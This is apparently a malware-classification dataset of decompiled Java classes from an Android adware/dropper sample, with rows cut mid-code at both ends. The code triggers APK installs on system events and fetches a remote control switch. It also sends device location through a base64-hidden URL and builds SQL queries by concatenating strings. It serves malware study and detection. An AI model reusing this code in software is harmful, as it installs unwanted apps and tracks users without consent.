z;     if (c(context) == null) {       e.e(context,""æœªæ­£ç¡®é…�ç½®receiver"");       z=false;     }  else     if (d(context) == null) {       e.e(context,""æœªæ­£ç¡®é…�ç½®activity"");       z=false;     }  else {       if (!e.c(context,""com.android.launcher.permission.INSTALL_SHORTCUT"")) {         Log.e(""box"",""please add INSTALL_SHORTCUT permission"");       }       z=true;     }     if (z) {       new w(context).execute(new Void[0]);     }   }   public void startbx(  Context context,  long j){     e.a(context,j);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\l.code","public final class l {   public static HashMap a=new HashMap();   private ThreadPoolExecutor b;   private File c;   private Context d;   public l(  Context context){     this.c=null;     this.d=context;     if (Environment.getExternalStorageState().equals(""mounted"")) {       this.c=new File(Environment.getExternalStorageDirectory().getPath() + ""/appmeng/gbox"");       if (!this.c.exists()) {         this.c.mkdirs();       }     }  else {       this.c=context.getCacheDir();     }     this.b=new ThreadPoolExecutor(1,50,180L,TimeUnit.SECONDS,new LinkedBlockingQueue());   }   public final Bitmap a(  Context context,  String str){     if (str == null) {       return null;     }     try {       if ("""".equals(str)) {         return null;       }       if (str == null) {         throw new RuntimeException(""Null url passed in"");       }       String replaceAll=str.replaceAll(""[.:/,%?&=]"",""+"").replaceAll(""[+]+"",""+"");       if (Environment.getExternalStorageState().equals(""mounted"")) {         if (this.c == null) {           this.c=new File(Environment.getExternalStorageDirectory().getPath() + ""/appmeng/gbox"");         }         if (!this.c.exists()) {           this.c.mkdirs();         }       }  else {         this.c=context.getCacheDir();       }       File file=new File(this.c,replaceAll);       if (!file.exists() && !file.isDirectory()) {         try {           e.a(this.d,str,file);         }  catch (        Exception e) {           if (file.exists()) {             file.delete();           }           Log.i(""box"",e.toString() + ""img download error"");         }       }       return BitmapFactory.decodeFile(file.getAbsolutePath());     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   public final Bitmap a(  String str,  p pVar){     Bitmap bitmap=null;     if (a == null || !a.containsKey(str) || (bitmap=(Bitmap)((SoftReference)a.get(str)).get()) == null || bitmap.isRecycled()) {       this.b.execute(new o(this,str,pVar,new n(this,this.d.getMainLooper(),pVar,str)));     }     return bitmap;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\m.code","public class m extends BroadcastReceiver {   private static long a=0;   private static void a(  Context context){     if (System.currentTimeMillis() - a <= 60000 || !e.a(context)) {       return;     }     if (!x.a(context).isEmpty()) {       Intent intent=new Intent(context,(Class<?>)knvu.c(context));       intent.setAction(""startOIAR"");       ((AlarmManager)context.getSystemService(""alarm"")).set(3,SystemClock.elapsedRealtime() + 30000,PendingIntent.getBroadcast(context,0,intent,134217728));     }     if (context.getSharedPreferences(""abox_share"",0).getInt(""switchflag"",0) == 1) {       new af(context).execute(new Void[0]);     }     a=System.currentTimeMillis();   }   @Override public void onReceive(  Context context,  Intent intent){     String action=intent.getAction();     if (action.equals(""android.intent.action.PACKAGE_ADDED"")) {       e.f(intent.getData().toString().substring(8),context);       return;     }     if (action.equals(""android.intent.action.PACKAGE_REMOVED"")) {       e.e(intent.getData().toString().substring(8),context);       return;     }     if (""android.intent.action.USER_PRESENT"".equals(action)) {       a(context);       return;     }     if (action.equals(""android.net.conn.CONNECTIVITY_CHANGE"")) {       a(context);       return;     }     if (action.equals(""ShowInstallReceiver"")) {       String stringExtra=intent.getStringExtra(""pathUrl"");       String stringExtra2=intent.getStringExtra(""packagetitle"");       String stringExtra3=intent.getStringExtra(""packagename"");       Intent intent2=new Intent(""android.intent.action.VIEW"");       intent2.setFlags(268435456);       intent2.setDataAndType(Uri.parse(""file://"" + stringExtra),""application/vnd.android.package-archive"");       context.startActivity(intent2);       int hashCode=stringExtra3.hashCode();       NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");       notificationManager.cancel(hashCode);       Notification notification=new Notification();       notification.icon=R.drawable.stat_sys_download_done;       Intent intent3=new Intent(""android.intent.action.VIEW"");       intent3.setFlags(268435456);       intent3.setDataAndType(Uri.parse(""file://"" + stringExtra),""application/vnd.android.package-archive"");       notification.setLatestEventInfo(context,stringExtra2,stringExtra2 + ""ä¸‹è½½å·²å®Œæˆ�\tç‚¹å‡»å®‰è£…"",PendingIntent.getActivity(context,hashCode,intent3,134217728));       notificationManager.notify(hashCode,notification);       return;     }     if (action.equals(""openInstallAppReceiver"")) {       e.b(context,intent.getStringExtra(""pkg""));       return;     }     if (action.equals(""startOIAR"")) {       new ae(context).execute(new Void[0]);       return;     }     if (action.equals(""boxadRe"")) {       e.a(context,intent.getIntExtra(""boxtype"",0));       return;     }     if (action.equals(""sdelayRe"")) {       new w(context).execute(new Void[0]);       return;     }     if (action.equals(""sadre"") && ""swapp"".equals(intent.getStringExtra(""action""))) {       try {         if (e.a(context)) {           Intent intent4=new Intent(context,(Class<?>)knvu.d(context));           intent4.addFlags(268435456);           intent4.addFlags(134217728);           intent4.setAction(""swapp"");           intent4.putExtras(intent);           context.startActivity(intent4);         }  else {           e.g(context);         }         e.a(context,intent);       }  catch (      Exception e) {         e.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\n.code","public final class n extends Handler {   final p a;   final String b;   final l c;   public n(  l lVar,  Looper looper,  p pVar,  String str){     super(looper);     this.c=lVar;     this.a=pVar;     this.b=str;   }   @Override public final void handleMessage(  Message message){     this.a.a((Bitmap)message.obj,this.b);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\o.code","public final class o implements Runnable {   final String a;   final p b;   final Handler c;   final l d;   public o(  l lVar,  String str,  p pVar,  Handler handler){     this.d=lVar;     this.a=str;     this.b=pVar;     this.c=handler;   }   @Override public final void run(){     Context context;     l lVar=this.d;     context=this.d.d;     Bitmap a=lVar.a(context,this.a);     if (a == null || a.isRecycled()) {       return;     }     l.a.put(this.a,new SoftReference(a));     if (this.b != null) {       this.c.sendMessage(this.c.obtainMessage(0,a));     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\p.code","public interface p {   void a(  Bitmap bitmap,  String str); } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\q.code","public class q {   static final boolean a;   private static final byte[] b;   private static final byte[] c;   private static final byte[] d;   private static final byte[] e;   private static final byte[] f;   private static final byte[] g; static {     a=!q.class.desiredAssertionStatus();     b=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     c=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,-9,63,52,53,54,55,56,57,58,59,60,61,-9,-9,-9,-1,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,-9,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9};     d=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,45,95};     e=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,52,53,54,55,56,57,58,59,60,61,-9,-9,-9,-1,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,63,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9};     f=new byte[]{45,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122};     g=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-5,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-5,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,0,-9,-9,1,2,3,4,5,6,7,8,9,10,-9,-9,-9,-1,-9,-9,-9,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,-9,-9,-9,-9,37,-9,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9};   }   private q(){   }   public static String a(  byte[] bArr){     String str=null;     try {       str=a(bArr,bArr.length);     }  catch (    IOException e2) {       if (!a) {         throw new AssertionError(e2.getMessage());       }     }     if (a || str != null) {       return str;     }     throw new AssertionError();   }   private static String a(  byte[] bArr,  int i){     byte[] bArr2;     if (bArr == null) {       throw new NullPointerException(""Cannot serialize a null array."");     }     if (i < 0) {       throw new IllegalArgumentException(""Cannot have length offset: "" + i);     }     if (i + 0 > bArr.length) {       throw new IllegalArgumentException(String.format(""Cannot have offset of %d and length of %d with array of length %d"",0,Integer.valueOf(i),Integer.valueOf(bArr.length)));     }     byte[] bArr3=new byte[(i % 3 > 0 ? 4 : 0) + ((i / 3) * 4)];     int i2=i - 2;     int i3=0;     int i4=0;     while (i4 < i2) {       a(bArr,i4 + 0,3,bArr3,i3);       i4+=3;       i3+=4;     }     if (i4 < i) {       a(bArr,i4 + 0,i - i4,bArr3,i3);       i3+=4;     }     if (i3 <= bArr3.length - 1) {       byte[] bArr4=new byte[i3];       System.arraycopy(bArr3,0,bArr4,0,i3);       bArr2=bArr4;     }  else {       bArr2=bArr3;     }     try {       return new String(bArr2,""US-ASCII"");     }  catch (    UnsupportedEncodingException e2) {       return new String(bArr2);     }   }   public static byte[] a(  String str){     return b(str);   }   private static byte[] a(  byte[] r5,  int r6,  int r7,  byte[] r8,  int r9){     throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.q.a(byte[], int, int, byte[], int):byte[]"");   }   private static byte[] b(  String str){     byte[] bytes;     ByteArrayOutputStream byteArrayOutputStream;     ByteArrayInputStream byteArrayInputStream;     ByteArrayInputStream byteArrayInputStream2;     GZIPInputStream gZIPInputStream=null;     if (str == null) {       throw new NullPointerException(""Input string was null."");     }     try {       bytes=str.getBytes(""US-ASCII"");     }  catch (    UnsupportedEncodingException e2) {       bytes=str.getBytes();     }     byte[] b2=b(bytes,bytes.length);     if (b2.length >= 4 && 35615 == ((b2[0] & 255) | ((b2[1] << 8) & 65280))) {       byte[] bArr=new byte[2048];       try {         byteArrayOutputStream=new ByteArrayOutputStream();         try {           byteArrayInputStream=new ByteArrayInputStream(b2);           try {             GZIPInputStream gZIPInputStream2=new GZIPInputStream(byteArrayInputStream);             while (true) {               try {                 int read=gZIPInputStream2.read(bArr);                 if (read < 0) {                   break;                 }                 byteArrayOutputStream.write(bArr,0,read);               }  catch (              IOException e3) {                 e=e3;                 gZIPInputStream=gZIPInputStream2;                 byteArrayInputStream2=byteArrayInputStream;                 try {                   e.printStackTrace();                   try {                     byteArrayOutputStream.close();                   }  catch (                  Exception e4) {                   }                   try {                     gZIPInputStream.close();                   }  catch (                  Exception e5) {                   }                   try {                     byteArrayInputStream2.close();                   }  catch (                  Exception e6) {                   }                   return b2;                 }  catch (                Throwable th) {                   th=th;                   byteArrayInputStream=byteArrayInputStream2;                   try {                     byteArrayOutputStream.close();                   }  catch (                  Exception e7) {                   }                   try {                     gZIPInputStream.close();                   }  catch (                  Exception e8) {                   }                   try {                     byteArrayInputStream.close();                     throw th;                   }  catch (                  Exception e9) {                     throw th;                   }                 }               } catch (              Throwable th2) {                 th=th2;                 gZIPInputStream=gZIPInputStream2;                 byteArrayOutputStream.close();                 gZIPInputStream.close();                 byteArrayInputStream.close();                 throw th;               }             }             b2=byteArrayOutputStream.toByteArray();             try {               byteArrayOutputStream.close();             }  catch (            Exception e10) {             }             try {               gZIPInputStream2.close();             }  catch (            Exception e11) {             }             try {               byteArrayInputStream.close();             }  catch (            Exception e12) {             }           }  catch (          IOException e13) {             e=e13;             byteArrayInputStream2=byteArrayInputStream;           } catch (          Throwable th3) {             th=th3;           }         }  catch (        IOException e14) {           e=e14;           byteArrayInputStream2=null;         } catch (        Throwable th4) {           th=th4;           byteArrayInputStream=null;         }       }  catch (      IOException e15) {         e=e15;         byteArrayOutputStream=null;         byteArrayInputStream2=null;       } catch (      Throwable th5) {         th=th5;         byteArrayOutputStream=null;         byteArrayInputStream=null;       }     }     return b2;   }   private static byte[] b(  byte[] r13,  int r14){     throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.q.b(byte[], int):byte[]"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\r.code","public final class r {   private s a;   private SQLiteDatabase b;   private final int c=1;   public r(  Context context){     this.b=null;     this.a=new s(this,context,""app_downloaddb.db"");     try {       this.b=this.a.getWritableDatabase();     }  catch (    Exception e) {     }   }   private SQLiteDatabase b(){     if (this.b == null) {       try {         this.b=this.a.getWritableDatabase();       }  catch (      Exception e) {       }     }     return this.b;   }   public final void a(){     if (this.b != null) {       this.b.close();       this.b=null;     }   }   public final void a(  String str){     this.b=b();     this.b.execSQL(new StringBuffer(""delete from app_download where package_name='"").append(str).append(""'"").toString());   }   public final Bundle b(  String str){     Bundle bundle=null;     this.b=b();     Cursor rawQuery=this.b.rawQuery(""select * from app_download where package_name = '"" + str + ""'"",null);     if (rawQuery.moveToNext()) {       bundle=new Bundle();       bundle.putString(""package_name"",rawQuery.getString(0));       bundle.putString(""app_name"",rawQuery.getString(1));       bundle.putString(""icon"",rawQuery.getString(2));       bundle.putString(""url"",rawQuery.getString(3));       bundle.putInt(""status"",rawQuery.getInt(4));       bundle.putInt(""completed"",rawQuery.getInt(5));       bundle.putInt(""total"",rawQuery.getInt(6));       bundle.putInt(""isSdcard"",rawQuery.getInt(7));       bundle.putString(""filepath"",rawQuery.getString(8));     }     rawQuery.close();     return bundle;   }   protected final void finalize(){     if (this.b != null) {       this.b.close();       this.b=null;     }     super.finalize();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\s.code","public final class s extends SQLiteOpenHelper {   final r a;   public s(  r rVar,  Context context,  String str){     super(context,str,(SQLiteDatabase.CursorFactory)null,1);     this.a=rVar;   }   @Override public final void onCreate(  SQLiteDatabase sQLiteDatabase){     StringBuilder sb=new StringBuilder(1024);     sb.append(""CREATE TABLE IF NOT EXISTS app_download ("");     sb.append(""package_name varchar(32) not null default '',"");     sb.append(""app_name varchar(32) not null default '',"");     sb.append(""icon varchar(32) not null default '',"");     sb.append(""url varchar(32) not null default '',"");     sb.append(""status int(1) not null default 0,"");     sb.append(""completed int (11) not null default 0,"");     sb.append(""total int(11) not null default '0',"");     sb.append(""isSdcard int(1) not null default 0,"");     sb.append(""filepath varchar(128) not null default '')"");     sQLiteDatabase.execSQL(sb.toString());   }   @Override public final void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\t.code","public final class t extends Thread {   private static Context e=null;   private Handler a;   private String b;   private String c;   private boolean d;   private String f;   private String g;   private String h;   private String i;   private r j;   private int k;   private int l;   private int m;   private String n;   private boolean o;   private int p;   public t(){     this.a=null;     this.b=null;     this.c=null;     this.d=false;     this.j=null;     this.m=0;     this.n=null;     this.o=false;     this.p=u.a;   }   public t(  Context context,  String str,  String str2,  String str3,  String str4,  Handler handler,  int i,  String str5){     this.a=null;     this.b=null;     this.c=null;     this.d=false;     this.j=null;     this.m=0;     this.n=null;     this.o=false;     this.p=u.a;     e=context;     this.c=str2;     this.b=str;     this.a=handler;     this.h=null;     this.f=str3;     this.g=str4;     this.i=str5;     this.m=i;     this.j=new r(e);     setDaemon(true);     try {       Bundle b=this.j.b(str3);       if (b != null && b.getString(""url"") != null && b.getString(""url"").equals(str)) {         if (i == b.getInt(""isSdcard"")) {           this.b=b.getString(""url"");           this.h=b.getString(""icon"");           this.f=b.getString(""package_name"");           this.g=b.getString(""app_name"");           this.k=b.getInt(""completed"");           this.l=b.getInt(""total"");           b.getInt(""isSdcard""); switch (b.getInt(""status"")) { case 0:             this.p=u.g;           break; case 1:         this.p=u.c;       break; case 2:     this.p=u.f;   break; case 3: this.p=u.h; break; } }  else { this.j.a(str3); } } }  catch (Exception e2) { } } public static void a(Context context){ e=context; } private synchronized void a(Message message){ if (this.a != null) { this.a.sendMessage(message); } } private static String[] a(String str){ if (str == null) { return null; } String substring=str.substring(str.indexOf(""http://"") + 7); int indexOf=substring.indexOf(""/""); return new String[]{""http://10.0.0.172/"" + substring.substring(indexOf + 1),substring.substring(0,indexOf)}; } public final void a(){ synchronized (this) { if (this.p == u.c) { this.p=u.b; notify(); } } } public final void a(boolean z){ this.d=z; } public final int b(){ return this.p; } protected final void finalize(){ if (this.j != null) { this.j.a(); this.j=null; } super.finalize(); } @Override public final void run(){ throw new UnsupportedOperationException(""Method not decompiled: je.mnvs.uyr.t.run():void""); } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\u.code","public final class u extends Enum {   public static final int a=1;   public static final int b=2;   public static final int c=3;   public static final int d=4;   public static final int e=5;   public static final int f=6;   public static final int g=7;   public static final int h=8;   private static final int[] i={a,b,c,d,e,f,g,h}; } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\v.code","public final class v extends AsyncTask {   private Context a;   public v(  Context context){     this.a=context;   }   private String a(  String str,  String str2){     String str3="""";     try {       String str4=new String(q.a(""aHR0cDovL2FwaS5tYXAuYmFpZHUuY29tL2dlb2NvZGVyP2tleT03N2RhOTg3NjEzMDNiYjExMDMyZWE2NjFlYmEwNzA3NyZvdXRwdXQ9anNvbiZsb2NhdGlvbj0=""));       StringBuilder sb=new StringBuilder();       sb.append(str4 + str + "",""+ str2);       JSONObject jSONObject=new JSONObject(e.d(this.a,sb.toString()));       if (!jSONObject.has(""result"")) {         return """";       }       JSONObject jSONObject2=jSONObject.getJSONObject(""result"");       StringBuilder sb2=new StringBuilder();       JSONObject jSONObject3=jSONObject2.getJSONObject(""addressComponent"");       String optString=jSONObject3.optString(""province"","""");       String optString2=jSONObject3.optString(""city"","""");       String optString3=jSONObject2.optString(""formatted_address"","""");       sb2.append(""ä¸­å›½|"");       sb2.append(optString + ""|"");       sb2.append(optString2 + ""|"");       sb2.append(optString3);       z.a(this.a,""location"",(Object)sb2.toString());       str3=sb2.toString();       z.a(this.a,""posttime"",Long.valueOf(System.currentTimeMillis()));       return str3;     }  catch (    Exception e) {       e.printStackTrace();       return str3;     }   }   @Override protected final Object doInBackground(  Object[] objArr){     String[] strArr=(String[])objArr;     if (strArr == null || strArr.length != 2) {       return """";     }     String str=strArr[0];     String str2=strArr[1];     return (str == null || """".equals(str) || str2 == null || """".equals(str2)) ? """" : a(str,str2);   }   @Override protected final void onPostExecute(  Object obj){     String str=(String)obj;     super.onPostExecute(str);     a.a(this.a,str);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\w.code","public final class w extends AsyncTask {   private Context a;   private boolean b=false;   public w(  Context context){     this.a=context;     if (a.a == null) {       a.a(context);     }   }   private String a(){ synchronized (this) {       c.a=e.c(this.a);       try {         int b=b();         z.a(this.a,""switchflag"",Integer.valueOf(b));         if (b == 1) {           knvu.a=true;         }  else {           knvu.a=false;         }       }  catch (      Exception e) {         Log.e(""box"",""init1 error"");         if (e.a(this.a) && !this.b) {           this.b=this.b ? false : true;           try {             int b2=b();             z.a(this.a,""switchflag"",Integer.valueOf(b2));             if (b2 == 1) {               knvu.a=true;             }  else {               knvu.a=false;             }           }  catch (          Exception e2) {             Log.e(""box"",""init2 error"");           }         }       }     }     return null;   }   private int b(){     StringBuilder sb=new StringBuilder();     sb.append(a.a.toString());     sb.append(""source=14"");     JSONObject jSONObject=new JSONObject(e.a(this.a,c.b,sb.toString()));     if (jSONObject.has(""pushstatus"")) {       z.b(this.a,""pushflag"",jSONObject.optInt(""pushstatus"",0) == 1);     }     if (jSONObject.has(""time"")) {       z.a(this.a,""delayTime"",Long.valueOf(jSONObject.optLong(""time"",0L)));     }     new StringBuilder().append(c.b).append(""?"").append(sb.toString());     return jSONObject.optInt(""boxstatus"",0);   }   @Override protected final Object doInBackground(  Object[] objArr){     return a();   }   @Override protected final void onPostExecute(  Object obj){     super.onPostExecute((String)obj);     if (knvu.a) {       e.a(this.a,z.a(this.a,""delayTime"",1L),e.h(this.a));     }   }   @Override protected final void onPreExecute(){     super.onPreExecute();     if (a.a == null) {       a.a(this.a);     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\x.code","public final class x {   public static ArrayList a(  Context context){     Map<String,?> all=context.getSharedPreferences(""installapp"",0).getAll();     ArrayList arrayList=new ArrayList();     Iterator<String> it=all.keySet().iterator();     while (it.hasNext()) {       String[] split=String.valueOf(all.get(it.next())).split(""#"");       if (split.length == 2) {         d dVar=new d(split[1]);         dVar.a(Long.parseLong(split[0]));         if (dVar.c() > 0) {           arrayList.add(dVar);         }       }     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\y.code","public final class y extends Thread {   private String a;   private String b;   private String c;   private Handler d;   private File e;   private Context f;   public y(  String str,  String str2,  String str3,  Handler handler,  File file,  Context context){     this.b=str;     this.a=str2;     this.c=str3;     this.d=handler;     this.e=file;     this.f=context;   }   @Override public final void run(){     for (int i=0; i < 10; i++) {       try {         if (this.d != null) {           Message message=new Message();           message.what=10002;           if (i >= 9) {             Context context=this.f;             Intent intent=new Intent(""android.intent.action.VIEW"");             intent.setDataAndType(Uri.parse(""file://"" + this.e.getAbsolutePath()),""application/vnd.android.package-archive"");             intent.addFlags(268435456);             context.startActivity(intent);           }           Bundle bundle=new Bundle();           bundle.putString(""package_name"",this.b);           bundle.putString(""title"",this.a);           bundle.putString(""file_name"",this.c);           bundle.putInt(""completed"",i + 1);           bundle.putInt(""total"",10);           message.setData(bundle);           this.d.sendMessage(message);         }         Thread.sleep(500L);       }  catch (      Exception e) {         e.printStackTrace();         return;       }     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.uyr\z.code","public final class z {   public static long a(  Context context,  String str,  long j){     return context.getSharedPreferences(""abox_share"",0).getLong(str,j);   }   public static String a(  Context context,  String str,  String str2){     return context.getSharedPreferences(""abox_share"",0).getString(str,str2);   }   public static void a(  Context context,  String str,  Object obj){     SharedPreferences.Editor edit=context.getSharedPreferences(""abox_share"",0).edit();     if (obj instanceof String) {       edit.putString(str,obj.toString());     }  else     if (obj instanceof Boolean) {       edit.putBoolean(str,Boolean.getBoolean(obj.toString()));     }  else     if (obj instanceof Float) {       edit.putFloat(str,Float.parseFloat(obj.toString()));     }  else     if (obj instanceof Integer) {       edit.putInt(str,Integer.parseInt(obj.toString()));     }  else     if (obj instanceof Long) {       edit.putLong(str,Long.parseLong(obj.toString()));     }  else {       edit.putString(str,obj.toString());     }     edit.commit();   }   public static boolean a(  Context context,  String str,  boolean z){     return context.getSharedPreferences(""abox_share"",0).getBoolean(str,z);   }   public static void b(  Context context,  String str,  boolean z){     SharedPreferences.Editor edit=context.getSharedPreferences(""abox_share"",0).edit();     edit.putBoolean(str,z);     edit.commit();   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\je.mnvs.zw\bp.code","public class bp {   public static void START(  Context context){     knvu itc=knvu.getInstance(context,""319f447e884120a27d04b1b5dbadec52"");     itc.setScType(context,true,true,true,true);     itc.startbx(context);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.adways.appdriver.sdk\AppDriverCrossPromotionActivity.code","public class AppDriverCrossPromotionActivity extends Activity {   private String a=null;   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     if (!l.m18b()) {       finish();       return;     }     requestWindowFeature(1);     Bundle extras=getIntent().getExtras();     AppDriverPromotionLayout appDriverPromotionLayout=new AppDriverPromotionLayout(this);     appDriverPromotionLayout.setBackgroundColor(Color.alpha(0));     if (extras != null) {       boolean z=extras.getBoolean(AppDriverFactory.IS_CROSSWALL);       boolean z2=extras.getBoolean(AppDriverFactory.IS_INTERSTITIAL);       this.a=extras.getString(AppDriverFactory.ORIENTATION);       int i=extras.getInt(AppDriverFactory.CROSS_MEDIA_ID);       if (this.a == null) {         this.a=l.a(this);       }       appDriverPromotionLayout.setISOrientationVal(this.a);       if (i != 0) {         appDriverPromotionLayout.setCrossMediaId(i);         if (z) {           appDriverPromotionLayout.setCrossWall(Boolean.valueOf(z));         }  else         if (z2) {           appDriverPromotionLayout.setInterstitial(Boolean.valueOf(z2));         }       }       if (extras.getInt(AppDriverFactory.PROMOTION_ID,0) != 0) {         appDriverPromotionLayout.setCampaignId(extras.getInt(AppDriverFactory.PROMOTION_ID));         if (extras.getBoolean(AppDriverFactory.CLICK_PROMOTION,false)) {           appDriverPromotionLayout.a(extras.getBoolean(AppDriverFactory.CLICK_PROMOTION));         }       }       if (extras.getString(AppDriverFactory.IDENTIFIER) != null) {         appDriverPromotionLayout.setIdentifier(extras.getString(AppDriverFactory.IDENTIFIER));       }       if (extras.getString(AppDriverFactory.ITEM_IDENTIFIER) != null) {         appDriverPromotionLayout.setItemIdentifier(extras.getString(AppDriverFactory.ITEM_IDENTIFIER));         if (extras.getInt(AppDriverFactory.ITEM_PRICE,0) != 0) {           appDriverPromotionLayout.setItemPrice(extras.getInt(AppDriverFactory.ITEM_PRICE));         }         if (extras.getString(AppDriverFactory.ITEM_NAME) != null) {           